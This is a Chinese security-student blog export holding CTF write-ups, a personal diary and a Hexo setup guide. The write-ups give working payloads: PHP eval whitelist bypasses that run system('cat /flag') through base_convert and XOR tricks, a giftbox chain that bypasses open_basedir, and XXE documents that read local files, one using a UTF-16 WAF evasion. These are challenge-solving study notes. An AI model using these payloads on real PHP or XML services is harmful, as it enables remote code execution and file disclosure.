<span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>hex2bin</code>不在白名单中, 使用<code>base_convert</code>来构造<code>hex2bin</code>.利用<code>base_convert</code>的36进制构造出所需的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base_convert(37907361743,10,36)==&apos;hex2bin&apos;</span><br><span class="line"> hex2bin(dechex(1598506324))==&apos;_GET&apos;</span><br></pre></td></tr></table></figure>
<p>那么</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(1598506324))==&apos;_GET&apos;</span><br></pre></td></tr></table></figure>
<p>调用参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?abs=cat%20/flag&amp;cos=system&amp;$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;cos&#125;($$pi&#123;abs&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="NESTCTF-2019-Love-Math-2">NESTCTF 2019 Love Math 2</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>长度限制非常严格, 考虑使用异或</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">$convert = [<span class="string">'decbin'</span>,<span class="string">'decoct'</span>];</span><br><span class="line"><span class="keyword">foreach</span>($whitelist <span class="keyword">as</span> $a)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($convert <span class="keyword">as</span> $b)&#123;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">999999</span>;$i++)&#123;</span><br><span class="line">            $result = $a ^ $b($i);</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">'/_GET|_POST|_REQUEST/'</span>,$result))&#123;</span><br><span class="line">                <span class="keyword">echo</span> $a.<span class="string">"^"</span>.$b.<span class="string">"("</span>.$i.<span class="string">")="</span>.$result.<span class="string">"\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20200114164206598.png" alt="image-20200114164206598"></p>
<p>然后构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c=$pi=$&#123;hexdec^decoct(31737)&#125;;$pi&#123;abs&#125;($pi&#123;cos&#125;);</span><br></pre></td></tr></table></figure>
<p>和上一题做一个对比看看</p>
<p><img src="/images/image-20200114173707940.png" alt="image-20200114173707940"></p>
<p>这就比较清楚了</p>
<p>最后是对php动态特性的究极使用,</p>
<h2 id="De1ta-ctf-2019-giftbox">De1ta ctf 2019 giftbox</h2>
<p>打开后是一个漂亮的沙盒</p>
<p><img src="/images/70123884-86ce2980-16ae-11ea-83e0-367a142a00ad.png" alt="image"></p>
<p>掠过中间的部分, 最后使用动态特性来执行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">targeting(&apos;a&apos;,&apos;chr&apos;)</span><br><span class="line">targeting(&apos;b&apos;,&apos;&#123;$a(46)&#125;&apos;)</span><br><span class="line">targeting(&apos;c&apos;,&apos;&#123;$b&#125;&#123;$b&#125;&apos;)</span><br><span class="line">targeting(&apos;d&apos;,&apos;&#123;$a(47)&#125;&apos;)</span><br><span class="line">targeting(&apos;e&apos;,&apos;js&apos;)</span><br><span class="line">targeting(&apos;f&apos;,&apos;open_basedir&apos;)</span><br><span class="line">targeting(&apos;g&apos;,&apos;chdir&apos;)</span><br><span class="line">targeting(&apos;h&apos;,&apos;ini_set&apos;)</span><br><span class="line">targeting(&apos;i&apos;,&apos;file_get_&apos;)</span><br><span class="line">targeting(&apos;j&apos;,&apos;&#123;$i&#125;contents&apos;)</span><br><span class="line">targeting(&apos;k&apos;,&apos;&#123;$g($e)&#125;&apos;)</span><br><span class="line">targeting(&apos;l&apos;,&apos;&#123;$h($f,$c)&#125;&apos;)</span><br><span class="line">targeting(&apos;m&apos;,&apos;&#123;$g($c)&#125;&apos;)</span><br><span class="line">targeting(&apos;n&apos;,&apos;&#123;$h($f,$d)&#125;&apos;)</span><br><span class="line">targeting(&apos;o&apos;,&apos;&#123;$d&#125;flag&apos;)</span><br><span class="line">targeting(&apos;p&apos;,&apos;&#123;$j($o)&#125;&apos;)</span><br><span class="line">targeting(&apos;q&apos;,&apos;printf&apos;)</span><br><span class="line">targeting(&apos;r&apos;,&apos;&#123;$q($p)&#125;&apos;)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>备忘录-xss</title>
    <url>/2020/01/14/%E5%A4%87%E5%BF%98%E5%BD%95-xss/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="240e4b27f6fd9b924ea038c0caa2557448c7bc569f6ff16e518ed0ad128e2f14"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>XXE 题型记录[working forever]</title>
    <url>/2019/04/22/XXE%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="CSAWQual-2019-Web-Unagi">CSAWQual 2019 Web_Unagi</h2>
<p>让我们上传xml文件并查看, 使用常规类型来读取发现被waf拦截, 根据wp转utf16绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x16.xml</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0'?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE users [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///flag" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>gg<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>ggg<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="GoogleCTF2019-Quals-Bnv">GoogleCTF2019 Quals Bnv</h2>
<p>翻翻源码知道了这是一个xxe</p>
<p>引用外部dtd文件并重新定义参数实体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ETITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure>
<h2 id="SecurinetsCTF-2019-feedback">SecurinetsCTF-2019 feedback</h2>
<p>进入页面。<br>
然后随便发一点什么东西试一试：<br>
<img src="https://user-images.githubusercontent.com/40637063/54907627-f3d6d000-4f20-11e9-860d-e967349bb159.png" alt></p>
<p>而且在网页的源代码中可以在<code>&lt;head&gt;</code>中找到以下脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function func()&#123;</span><br><span class="line">    var xml = &apos;&apos; +</span><br><span class="line">        &apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&apos; +</span><br><span class="line">        &apos;&lt;feedback&gt;&apos; +</span><br><span class="line">        &apos;&lt;author&gt;&apos; + $(&apos;input[name=&quot;name&quot;]&apos;).val() + &apos;&lt;/author&gt;&apos; +</span><br><span class="line">        &apos;&lt;email&gt;&apos; + $(&apos;input[name=&quot;email&quot;]&apos;).val() + &apos;&lt;/email&gt;&apos; +</span><br><span class="line">        &apos;&lt;content&gt;&apos; + $(&apos;input[name=&quot;feedback&quot;]&apos;).val() + &apos;&lt;/content&gt;&apos; +</span><br><span class="line">        &apos;&lt;/feedback&gt;&apos;;</span><br><span class="line">    var xmlhttp = new XMLHttpRequest();</span><br><span class="line">    xmlhttp.onreadystatechange = function () &#123;</span><br><span class="line">        if(xmlhttp.readyState == 4)&#123;</span><br><span class="line">            console.log(xmlhttp.readyState);</span><br><span class="line">            console.log(xmlhttp.responseText);</span><br><span class="line">            document.getElementById(&apos;Message&apos;).innerHTML = xmlhttp.responseText;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;POST&quot;,&quot;feed.php&quot;,true);</span><br><span class="line">    xmlhttp.send(xml);</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>可以看出来这是个发送<code>xml</code>的脚本。我们将发送的数据抓包，的确是xml。<br>
那么考虑<code>xxe</code>。抓包发包如下：</p>
<p><img src="https://user-images.githubusercontent.com/40637063/54907916-ab6be200-4f21-11e9-9471-bff46378d15d.png" alt></p>
<p>解码即可得到flag.<br>
切记：任何细微的语法错误(比如忘了分号)都将导致回显失败。</p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>临行前夜--2019</title>
    <url>/2020/01/08/note-before-back/</url>
    <content><![CDATA[<p>昨晚约好的车今天早上竟然被司机一声不吭取消了, 真的无语…得亏睡得浅起床看了一眼.新约的车又要早早开往机场, 于是无奈起了个大早. 到达后又被通知延误, 也不知和离开时候的飞雪有无关系, 但不管怎样, 孤身顶着鹅毛行走路上, 这样离开倒还是别有风味, 于是也有了碎碎念的兴致.</p>
<p>今年的事情较去年简单了很多, 也没那么多想法, 总结起来无非就是把系统换成了ubuntu又换回了windows, 在环境上下了很多功夫, 浪费了很多时间, 打了几次被带飞的比赛, 去了趟xman, 认识了一些很有趣的朋友和网友, 然后觉得自己更加的菜要努力了, 其他没了.</p>
<p>没了?</p>
<p>看起来的确是这样平淡的一年, 也没有什么特别值得纪念的事情, 就在自己怀着&quot;啊又是平淡的一年啊&quot;的心态准备开始2020的时候, 由于一些意外, 我开始追求自己喜欢的姑娘了. 虽然不知道结果如何, 反正不后悔就是了, 临阵脱逃这种事情要是做了会被自己看不起的.</p>
<p>另外, 也得列个新年计划吧, 不然可太水了:</p>
<ul>
<li>学会java web</li>
<li>django搭博客</li>
<li>flask 搭博客</li>
<li><strong>每天至少刷题一道web一道密码</strong></li>
<li><strong>每天回忆复习, 每周回忆和复习</strong></li>
<li>每天吃水果</li>
<li>看完书
<ul>
<li>web前端黑客技术解密</li>
<li>白帽子讲web安全</li>
</ul>
</li>
<li>10点之后不看b站, 早睡早起</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>使用hexo和github搭建网站</title>
    <url>/2019/04/22/%E9%80%82%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<blockquote>
<p>这篇文章主要记录使用hexo和github搭建网站的过程，参考了很多博客</p>
</blockquote>
<h2 id="node-js安装-使用nvm">node.js安装(使用nvm)</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.34.0/install.sh | bash</span><br><span class="line"></span><br><span class="line"># switch node version</span><br><span class="line"># set the newest version as default</span><br><span class="line">nvm use node</span><br><span class="line">nvm alias default node</span><br></pre></td></tr></table></figure>
<h2 id="npm-install">npm install</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
<p>see the link below:</p>
<p><a href="https://npm.taobao.org/" target="_blank" rel="noopener">https://npm.taobao.org/</a></p>
<h2 id="hexo-安装">hexo 安装</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir blog</span><br><span class="line">cd blog</span><br><span class="line">mkdir hexo</span><br><span class="line">cd hexo </span><br><span class="line">cnpm install hexo-cli -g</span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p>访问4000端口就可以看见博客了</p>
<h2 id="网站个人信息修改">网站个人信息修改</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#在example.github.io目录下</span><br><span class="line">vim _config.yml</span><br><span class="line">在这里修改：</span><br><span class="line"></span><br><span class="line">title:</span><br><span class="line">subtitle:</span><br><span class="line">description:</span><br><span class="line">.......</span><br><span class="line"># vim 快速查找用/keyword ，按n下一个</span><br></pre></td></tr></table></figure>
<h2 id="主题选择">主题选择</h2>
<p>个人比较喜欢next</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next</span><br></pre></td></tr></table></figure>
<p>进入themes目录下的新主题目录中，查看<code>_config.yml</code> 文件,修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theme:hexo-theme-next</span><br></pre></td></tr></table></figure>
<p>然后进入hexo-theme-next目录下的<code>_config.yml</code>文件，依据个人偏好修改风格：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line"># scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br><span class="line"># 选择一个喜欢的，去掉#即可</span><br></pre></td></tr></table></figure>
<p>重新生成运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p>再次访问即可看到效果</p>
<h2 id="修枝剪叶">修枝剪叶</h2>
<p>要想设置右侧栏(我用的是Gemini)的头像，进入主题配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sidebar avatar</span><br><span class="line">avatar: /images/header.jpg</span><br></pre></td></tr></table></figure>
<p>将header.jpg放在主题文件夹下的images中即可。</p>
<p>修改联系方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#主题文件夹中的_config.yml文件</span><br><span class="line">social:</span><br><span class="line">  github: https://github.com/your-user-name</span><br><span class="line">  twitter: https://twitter.com/your-user-name</span><br><span class="line">  #还有很多</span><br></pre></td></tr></table></figure>
<h2 id="部署到github">部署到github</h2>
<p>在你的github账户上创建仓库<code>yourusername.github.io</code>，必须是用户名开头命名，否则<code>github page</code>不会生效。</p>
<h3 id="密钥部署">密钥部署</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</span><br><span class="line">然后将公钥粘贴进github账户的个人设置里面</span><br><span class="line">ssh -T git@github.com</span><br><span class="line">git config --global user.name &quot;username&quot;</span><br><span class="line">git config --global user.email &quot;email&quot;</span><br></pre></td></tr></table></figure>
<h3 id="安装hexo-deployer-git">安装hexo-deployer-git</h3>
<p>在博客目录下下载：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>修改网站根目录下的_config.yml文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">	type: git#注意git的前面要加空格否则不生效</span><br><span class="line">   repo: https://github.com/example/example.github.io.git</span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure>
<p>保存退出后执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">git config --global user.name &quot;Your Name&quot;</span><br><span class="line">hexo d #部署</span><br></pre></td></tr></table></figure>
<h2 id="使用hexo-admin写博客-abandoned-and-use-typora-instead">使用hexo-admin写博客(abandoned, and use typora instead)</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-admin</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p>访问<code>url/admin</code>即可编辑博客</p>
<h2 id="友链">友链</h2>
<p>在主题的<code>_config.yml</code>文件里面的link项目里面设置即可。</p>
<h2 id="站内搜索">站内搜索</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<p>修改主题的配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Local search</span><br><span class="line"># Dependencies: https://github.com/theme-next/hexo-generator-searchdb</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 3</span><br></pre></td></tr></table></figure>
<h2 id="粒子效果添加">粒子效果添加</h2>
<p><a href="https://github.com/theme-next/theme-next-canvas-nest" target="_blank" rel="noopener">https://github.com/theme-next/theme-next-canvas-nest</a></p>
<p>配置文件可能有所不同,把false改成true就可以了</p>
<h2 id="显示更新时间">显示更新时间</h2>
<p>主题配置文件中的<code>update_at</code> 修改为true</p>
<h3 id="博客按照修改时间来排序">博客按照修改时间来排序</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-index-updated --save</span><br></pre></td></tr></table></figure>
<p>在config.yml中的order by的值改为<code>-updated</code></p>
<h2 id="统计功能">统计功能</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure>
<p>修改<code>post_wordcount</code></p>
<h2 id="顶部加载条">顶部加载条</h2>
<p>在<code>/themes/next/layout/_partials/head.swig</code> 中修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=&quot;UTF-8&quot;/&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot; /&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;/&gt;</span><br><span class="line">在这后面添加</span><br><span class="line">&lt;script src=&quot;//cdn.bootcss.com/pace/1.0.2/pace.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;link href=&quot;//cdn.bootcss.com/pace/1.0.2/themes/black/pace-theme-flash.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="主页添加阴影">主页添加阴影</h2>
<p>打开主题文件下的<code>\source\css\_custom\custom.styl</code>,向里面加入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.post &#123;</span><br><span class="line">  margin-top: 60px;</span><br><span class="line">  margin-bottom: 60px;</span><br><span class="line">  padding: 25px;</span><br><span class="line">  -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">  -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h2 id="自定义图标">自定义图标</h2>
<p><a href="https://www.easyicon.net/language.en/iconsearch" target="_blank" rel="noopener">https://www.easyicon.net/language.en/iconsearch</a></p>
<p>下载32的,然后放在主题文件中的images文件中,在配置中搜索favicon并修改</p>
<h2 id="统计访问人数">统计访问人数</h2>
<p>在<code>themes/你的主题/layout/_partial/footer.swig</code>中定位并插入如下代码：</p>
